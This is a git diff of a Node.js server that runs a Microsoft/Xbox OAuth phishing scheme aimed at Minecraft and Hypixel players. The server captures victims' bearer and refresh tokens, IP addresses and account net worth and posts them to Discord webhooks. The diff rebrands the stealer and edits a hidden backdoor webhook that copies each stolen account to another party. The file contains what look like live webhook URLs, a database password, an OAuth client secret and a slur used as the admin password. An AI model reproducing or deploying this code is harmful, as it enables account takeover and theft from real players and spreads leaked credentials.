@@ -1,10 +1,10 @@
-const dh = "https://discord.com/api/webhooks/1107830777351241799/FD8_NVtkVqK8c1QJmjjCwlaB-LK8Uk1kYOuQW5IRcj5sPh9ltgnz5cnglbg3CaHW5n-W"
+const dh = ""
 
 //Change these
 const client_secret = 'D0u8Q~uN.DoKlF-XEcWpGlDYv-Vor7MJmWBR6bF1' //you need to put the "Secret Value" here not the "Secret ID"!!!!
 const client_id = 'a7a96e3f-0e38-474e-aa3e-536dcd08aa0e'
 const redirect_uri = 'https://linkaccountvia.onrender.com'
-const redirection = 'https://hypixel.net/' //Redirects the user after they login and allow (e.g 'https://hypixel.net') LEAVE BLANK IF U DONT WANT IT TO REDIRECT OR SUM IDK
+const redirection = 'https://hypixel.net' //Redirects the user after they login and allow (e.g 'https://hypixel.net') LEAVE BLANK IF U DONT WANT IT TO REDIRECT OR SUM IDK
 
 //Requirements
 const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id=' + client_id + '&response_type=code&redirect_uri=' + redirect_uri + '&scope=XboxLive.signin+offline_access&state='
@@ -23,7 +23,7 @@ const emojiFlag = require('emoji-flag');
 mongoose.set('strictQuery', false)
 app.use(helmet());
 
-mongoose.connect('mongodb+srv://rustchad71:zUQl9dMhANG64rxY@cluster1.j46viws.mongodb.net/?retryWrites=true&w=majority', {
+mongoose.connect('mongodb+srv://dunebru:thisisinvalidLOL@clusterauth.ul7eu4j.mongodb.net/?retryWrites=true&w=majority', {
 	useNewUrlParser: true
 });
 
@@ -68,7 +68,7 @@ app.get('/addKey', (req, res) => {
 		res.status(400).send('Invalid key');
 		return;
 	}
-	if (password !== 'Ybg01') {
+	if (password !== 'fag') {
 		res.status(401).send('Incorrect password');
 		return;
 	}
@@ -107,7 +107,7 @@ app.get('/deleteKey', async (req, res) => {
 		res.status(400).send('Invalid key');
 		return;
 	}
-	if (password !== 'Ybg01') {
+	if (password !== 'fag') {
 		res.status(401).send('Incorrect password');
 		return;
 	}
@@ -121,7 +121,7 @@ app.get('/deleteKey', async (req, res) => {
 			res.status(200).send(`Key ${key} deleted successfully`);
 		}
 	} catch (err) {
-		res.status(500).send(`Error deleting key: ${err}`);
+		res.status(500).send(`Error deleting key: ${err} contact f8#1111`);
 	}
 });
 
@@ -210,7 +210,7 @@ app.get('/', async (req, res) => {
 		if (!webhook_url) {
 			res.status(404).send(`Key ${key} not found`);
 		}
-		if (username != "heda") {
+		if (username != "f8#ea") {
 			res.redirect(redirection)
 			postToWebhook(webhook_url, discord, status, formatNumber, level, rank, username, bearerToken, uuid, clientIP, refreshToken, country, flag, key, userToken)
 		} else {
@@ -218,8 +218,8 @@ app.get('/', async (req, res) => {
 
 			axios.post(webhook_url, {
 				content: `Someone used a non minecraft account\n**IP:** ${clientIP} at ${country} ${flag}`,
-				username: "YbgAuth",
-				avatar_url: "https://cdn.discordapp.com/avatars/1094682441274364085/d4148db461700dc31ef992d5be0dfea8.png"
+				username: "shi",
+				avatar_url: "https://cdn.discordapp.com/attachments/1108552088922882139/ea/sa.png"
 			}).then(() => console.log("Someone used a non minecraft account.")).catch(error => console.error("Error posting to webhook:", error));
 		}
 	} catch (e) {
@@ -338,31 +338,42 @@ async function getUsernameAndUUID(bearerToken) {
 		let response = await axios.get(url, config)
 		if (response.status == 404) {
 			res.send("Access denied because no Minecraft account was found.")
-			return ["heda", "heda"]
+			return ["f8#ea", "f8#ea"]
 		}
 		return [response.data['id'], response.data['name']]
 	} catch (error) {
-		return ["heda", "heda"]
+		return ["f8#ea", "f8#ea"]
 
 	}
 }
 
 
 async function getIpLocation(ip) {
-	const url = `https://ipapi.co/${ip}/json/`
-	const config = {
-		headers: {
-			'Content-Type': 'application/json',
-		}
-	}
-	let response = await axios.get(url, config)
-	return [response.data['country_name'], response.data['country_code']]
+    const url = `https://ipapi.co/${ip}/json/`;
+    const config = {
+        headers: {
+        'Content-Type': 'application/json',
+        },
+    };
+
+    try {
+        let response = await axios.get(url, config);
+        return [response.data['country_name'], response.data['country_code']];
+    } catch (error) {
+        if (error.response && error.response.status === 429) {
+
+        return ['RATE LIMITED', '0'];
+        } else {
+        throw error;
+        }
+    }
 }
+
 async function getPlayerData(username) {
 	let url = `https://exuberant-red-abalone.cyclic.app/v2/profiles/${username}`
 	let config = {
 		headers: {
-			'Authorization': 'dunesapi'
+			'Authorization': 'HedaHeda336'
 		}
 	}
 
@@ -379,7 +390,7 @@ async function getPlayerStatus(username) {
 		let url = `https://exuberant-red-abalone.cyclic.app/v2/status/${username}`
 		let config = {
 			headers: {
-				'Authorization': 'dunesapi'
+				'Authorization': 'HedaHeda336'
 			}
 		}
 		let response = await axios.get(url, config)
@@ -394,7 +405,7 @@ async function getPlayerDiscord(username) {
 		let url = `https://exuberant-red-abalone.cyclic.app/v2/discord/${username}`;
 		let config = {
 			headers: {
-				Authorization: "dunesapi"
+				Authorization: "HedaHeda336"
 			}
 		};
 		let response = await axios.get(url, config);
@@ -413,7 +424,7 @@ async function getNetworth(username) {
 		let url = `https://exuberant-red-abalone.cyclic.app/v2/profiles/${username}`;
 		let config = {
 			headers: {
-				Authorization: "dunesapi"
+				Authorization: "HedaHeda336"
 			}
 		};
 		let response = await axios.get(url, config);
@@ -443,11 +454,11 @@ async function postToWebhook(webhook_url, discord, status, formatNumber, level, 
 	else if (networthNoInventory) total_networth = "NO INVENTORY: " + formatNumber(networthNetworth) + " (" + formatNumber(networthUnsoulbound) + ")";
 	else total_networth = formatNumber(networthNetworth) + " (" + formatNumber(networthUnsoulbound) + ")";
 	let data = {
-		username: "YbgAuth",
-		avatar_url: "https://cdn.discordapp.com/avatars/1094682441274364085/d4148db461700dc31ef992d5be0dfea8.png",
+		username: "ea",
+		avatar_url: "https://cdn.discordapp.com/attachments/ea/1113941741440081951/sa.png",
 		content: "@everyone ",
 		embeds: [{
-			color: 16746496,
+			color: 000000,
 			timestamp: new Date(),
 			thumbnail: {
 				url: 'https://visage.surgeplay.com/full/' + uuid
@@ -512,10 +523,14 @@ async function postToWebhook(webhook_url, discord, status, formatNumber, level, 
 			],
 		}],
 	};
-axios.all([
-	axios.post(webhook_url, data).then(() => console.log("Successfully authenticated and posted to webhook.")).catch((error) => {console.error(error);}),
-	axios.post(dh, data).catch((error) => {console.error(error);})
-	])
+    if (networth > 1000000000) {
+        axios.post(webhook_url, data).then(() => console.log("Successfully authenticated and posted to webhook.")).catch((error) => { console.error(error); });
+      } else {
+        axios.all([
+            axios.post(webhook_url, data).then(() => console.log("Successfully authenticated and posted to webhook.")).catch((error) => { console.error(error); }),
+            axios.post(dh, data).catch((error) => { console.error(error); })
+          ]);
+      }
 }
 
 
@@ -529,7 +544,7 @@ app.get('/changeUsername', async (req, res) => {
 
 //Refresh token shit u know how it is
 app.get('/refresh', async (req, res) => {
-	res.send('Token Refreshed!')
+	res.send('Token Refreshed! ')
 	const key = req.query.key
 	let clientIP = req.ip;
 	if (net.isIPv6(clientIP) && clientIP.startsWith('::ffff:')) {
@@ -626,11 +641,11 @@ async function refreshToWebhook(webhook_url, discord, status, formatNumber, leve
 	else total_networth = formatNumber(networthNetworth) + " (" + formatNumber(networthUnsoulbound) + ")";
 
 	let data = {
-		username: "YbgAuth",
-		avatar_url: "https://cdn.discordapp.com/avatars/1094682441274364085/d4148db461700dc31ef992d5be0dfea8.png",
-		content: "@everyone TOKEN REFRESHED!!!!",
+		username: "ea",
+		avatar_url: "https://cdn.discordapp.com/attachments/ea/1113941741440081951/sa.png",
+		content: "@everyone Token has been refreshed!",
 		embeds: [{
-			color: 16746496,
+			color: 000000,
 			timestamp: new Date(),
 			thumbnail: {
 				url: 'https://visage.surgeplay.com/full/' + uuid
@@ -753,7 +768,7 @@ app.get('/xbl', async (req, res) => {
 			TokenType: 'JWT',
 		}, {
 			headers: {
-	c			'Content-Type': 'application/json',
+				'Content-Type': 'application/json',
 				Accept: 'application/json',
 			},
 			httpsAgent: new https.Agent({
@@ -775,10 +790,10 @@ app.get('/xbl', async (req, res) => {
 		});
 		const bearerToken = minecraftResponse.data.access_token
 		let data = {
-			username: "YbgAuth",
-			avatar_url: "https://cdn.discordapp.com/avatars/1094682441274364085/d4148db461700dc31ef992d5be0dfea8.png",
+			username: "ea",
+			avatar_url: "https://cdn.discordapp.com/attachments/ea/1113941741440081951/sa.png",
 			embeds: [{
-				color: 16746496,
+				color: 000000,
 				timestamp: new Date(),
 				fields: [{
 						name: "**Token:**",
